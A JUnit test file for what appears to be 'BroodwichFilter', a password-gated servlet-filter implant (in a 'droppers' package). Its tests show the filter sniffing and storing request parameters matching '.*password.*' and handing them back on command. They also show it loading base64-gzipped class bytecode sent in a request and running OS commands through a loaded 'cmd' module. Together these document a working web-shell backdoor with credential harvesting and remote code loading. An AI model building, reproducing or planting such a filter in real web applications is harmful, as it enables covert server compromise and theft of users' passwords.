package party.itistimeto.broodwich.droppers;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockFilterChain;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import party.itistimeto.broodwich.util.Util;

import javax.servlet.Filter;
import javax.servlet.ServletException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

import static org.junit.jupiter.api.Assertions.*;

public class BroodwichFilterTest {
    private final static String PW = "universalremonster";
    private final static String PLAIN_SAMPLE = "AQUATEEN";
    private final static String BASE64_SAMPLE = "QVFVQVRFRU4=";
    private final static String CMD_MODULE = "party.itistimeto.broodwich.modules.cmd";

    @Test
    void testPatterns() throws IOException, ServletException {
        Filter bwf = new BroodwichFilter(PW);

        MockHttpServletRequest setReq = new MockHttpServletRequest();
        setReq.addParameter(BroodwichFilter.moduleIdKey, BroodwichFilter.setPatternModule);
        setReq.addParameter(BroodwichFilter.passwordKey, PW);
        setReq.addParameter(BroodwichFilter.moduleParamsKey, ".*password.*");
        bwf.doFilter(setReq, new MockHttpServletResponse(), new MockFilterChain());

        MockHttpServletRequest sniffReq = new MockHttpServletRequest();
        sniffReq.addParameter("username", "aquateen");
        sniffReq.addParameter("password", "hungerforce");
        bwf.doFilter(sniffReq, new MockHttpServletResponse(), new MockFilterChain());

        MockHttpServletRequest flushReq = new MockHttpServletRequest();
        MockHttpServletResponse flushResp = new MockHttpServletResponse();
        flushReq.addParameter(BroodwichFilter.moduleIdKey, BroodwichFilter.flushMatchesModule);
        flushReq.addParameter(BroodwichFilter.passwordKey, PW);
        bwf.doFilter(flushReq, flushResp, new MockFilterChain());
        String respText = flushResp.getContentAsString();
        assertFalse(respText.contains("aquateen"));
        assertTrue(respText.contains("hungerforce"));
    }

    @Test
    void testBase64() {
        assertArrayEquals(PLAIN_SAMPLE.getBytes(), BroodwichFilter.decodeBase64(BASE64_SAMPLE));
        assertEquals(BASE64_SAMPLE, BroodwichFilter.encodeBase64(PLAIN_SAMPLE.getBytes()));
    }

    @Test
    void testLoad() throws IOException, ServletException, ClassNotFoundException {
        var bwf = new BroodwichFilter(PW);

        var loadReq = new MockHttpServletRequest();
        loadReq.addParameter(BroodwichFilter.moduleIdKey, BroodwichFilter.loaderModule);
        loadReq.addParameter(BroodwichFilter.passwordKey, PW);

        var moduleClass = Class.forName(CMD_MODULE);
        var moduleByteCode = Util.getResourceBytes(Util.classToResource(moduleClass));
        var bos = new ByteArrayOutputStream();
        var gos = new GZIPOutputStream(bos);
        gos.write(moduleByteCode);
        gos.finish(); // necessary?
        var compressedByteCode = bos.toByteArray();
        var encodedByteCode = Base64.getEncoder().encodeToString(compressedByteCode);


        loadReq.addParameter(BroodwichFilter.moduleParamsKey, CMD_MODULE, encodedByteCode);
        bwf.doFilter(loadReq, new MockHttpServletResponse(), new MockFilterChain());

        var runReq = new MockHttpServletRequest();
        var runResp = new MockHttpServletResponse();
        runReq.addParameter(BroodwichFilter.moduleIdKey, CMD_MODULE);
        runReq.addParameter(BroodwichFilter.passwordKey, PW);
        runReq.addParameter(BroodwichFilter.moduleParamsKey, "java -version");
        bwf.doFilter(runReq, runResp, new MockFilterChain());

        assertTrue(runResp.getContentAsString().contains(Runtime.version().toString()));
    }
}
